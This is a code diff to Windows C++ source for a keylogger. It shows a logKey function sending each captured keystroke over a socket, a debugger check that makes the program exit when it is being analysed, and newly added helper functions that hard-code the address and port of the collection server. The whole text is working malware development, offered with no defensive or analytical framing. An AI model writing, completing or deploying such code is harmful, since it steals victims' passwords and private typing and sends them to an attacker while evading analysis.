@@ -31,6 +31,16 @@ void logKey(int key, SOCKET sock, pSend Send) {
     Send(sock, buffer, 1, 0);
 }
 
+// Function to return server IP address
+std::string getServerIp() {
+    return "192.168.1.1";  // Replace with your actual server IP
+}
+
+// Function to return server port
+int getServerPort() {
+    return 12345;  // Replace with your actual server port
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     if (isDebugged()) return 1;
 
@@ -59,9 +69,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
 
-    // Use dynamic resolution for IP and port
-    std::string serverIp = getServerIp();  // Implement this function to fetch or calculate server IP
-    int serverPort = getServerPort();      // Implement this function to fetch or calculate server port
+    std::string serverIp = getServerIp();  // Get the server IP
+    int serverPort = getServerPort();      // Get the server port
 
     sockaddr_in server;
     server.sin_family = AF_INET;
